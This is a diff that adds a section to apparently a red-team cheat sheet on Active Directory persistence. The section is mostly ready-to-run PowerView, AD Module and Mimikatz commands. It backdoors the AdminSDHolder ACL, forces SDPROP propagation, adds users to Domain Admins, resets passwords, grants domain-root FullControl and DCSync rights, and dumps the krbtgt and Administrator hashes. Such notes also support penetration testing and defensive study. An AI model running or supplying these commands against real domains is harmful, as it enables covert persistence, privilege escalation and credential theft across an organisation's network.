@@ -256,3 +256,138 @@ Invoke-Mimikatz -Command '"misc::memssp"'
 ```
 
 All local logons on the domain controller are logged to `C:\Windows\system32\kiwissp.log`.
+
+# Using ACLs
+
+Resides in the system container of a domain and used to control the permissions using an ACL for certain built-in privileged groups which are called the `protected groups`.
+
+Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.
+
+Lis of protected groups and how can be abused some of them can log on locally to the domain controller:
+
+* **Account Operators**: Can modify nesteg groups.
+* **Bakup Operators**: Backup GPO, edit ato add SID of controller account to a privileged gorup and restore.
+* **Server Operators**: Run a command as system
+* **Print Operators**: Copy ntds.dit backup, load device drivers.
+* **Domain Admins**: Can log on.
+* **Replicator**: Can log on.
+* **Enterprise Admins**: Can log on.
+* **Domain Controllers**: Can log on.
+* **Read-only Domain Controllers**: Can log on.
+* **Schema Admins**: Can log on.
+* **Administrators**: Can log on.
+
+With Domain Admin privileges which means that we have full control and write permissions on the `AdminSDHolder` object, this full control can be abused to create a backdoor or persistence mechanism by adding a user with **Full Permissions** to the AdminSDHolder object.
+
+In 60 minutes when the SDPROP is runned, the user will be added with Full Control access to the ACL of gropus like Domain Admins without actually being a member of it.
+
+Fist we need to add full controll permissions fo a user to the AdminSDHolder:
+
+* PowerView:
+```powershell
+Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName user1 -Rights All -Verbose
+```
+* AD Module:
+```powershell
+Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -Principal user1 -Verbose 
+```
+
+> **Note**: Other interesing permissions for a user to the AdminSDHolder:
+>
+> `ResetPassword`, `WriteMembers`.
+
+After 60 minutes the ACL will be propagated automatically to the domain.
+
+It can be also posible to propagate it manually with `Invoke-SDPropatagor.ps1`
+
+```powershell
+$sess = New-PSSession -ComputerName dc01.corp.local
+Invoke-Command -FilePath .\Invoke-SDPropagator.ps1 -Session $sess
+Enter-PSSession -Session $sess
+
+And on the DC:
+Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
+```
+
+To check the Domain Admin Permissions as normal user:
+
+* PowerView:
+```powershell
+Get-ObjectACL -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'user1'}
+```
+
+* AD Module:
+```powershell
+(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=corp,DC=local').Access | ?{$_.IdentityReference -match 'user1'}
+```
+
+> **Note**: `GenericAll` means that has FullControl to an object.
+
+Finally we just need to abuse it.
+
+## Abusing FullControl ACL
+
+* PowerView:
+```powershell
+Add-DomainGroupMember -Identity 'Domain Admins' -Members user2 -Verbose
+```
+
+* AD Module:
+```powershell
+Add-ADGroupMember -Identity 'Domain Admins' -Members user2 -Verbose
+```
+
+## Abusing ResetPassword ACL
+
+* PowerView:
+```powershell
+Set-DomainUserPassword -Identity user2 -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Verbose
+```
+* AD Module:
+```powershell
+Set-ADACcountPassword -Identity user2 -NewPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Verbose
+```
+
+
+## Abusing FullControl ACL in domain root
+
+There are even more intereting ACLs which can be abused. With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl.
+ 
+
+First, add full control rights:
+
+* PowerView:
+```powershell
+Add-ObjectAcl -TargetDistinguishedName 'DC=corp,DC=local' -PrincipalSamAccountName user1 -Rights All -Verbose
+```
+
+* AD Module:
+```powershell
+Set-ADACL -DistinguishedName 'DC=corp,DC=local' -Principal user1 -Verbose
+```
+
+## Abusing DCSync in domain root
+
+There are even more intereting ACLs which can be abused. With DA privileges, the ACL for the domain root can be modified to provide useful rights like the ability to run `DCSync`.
+
+* PowerView:
+```powershell
+Add-ObjectAcl -TargetDistinguishedName 'DC=corp,DC=local' -PrincipalSamAccountName user1 -Rights DCSync -Verbose
+```
+
+* AD Module:
+```powershell
+Set-ADACL -DistinguishedName 'DC=corp,DC=local' -Principal user1 -GUIDRight DCSync -Verbose
+```
+
+> **Note**: There are three special rights which are required to DCSync:
+>
+> `Replicating Directory Changes`, `Replicating Directory Changes All` and `Replicating Directory Changes In Filtered Set`.
+
+And then execute DCSync:
+
+```powershell
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\krbtgt"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\Administrator"'
+```
+So once we have obtained the hash NTLM of *any user* of the domain, `PassTheHash` or `Over-PassTheHash` attack can be executed.
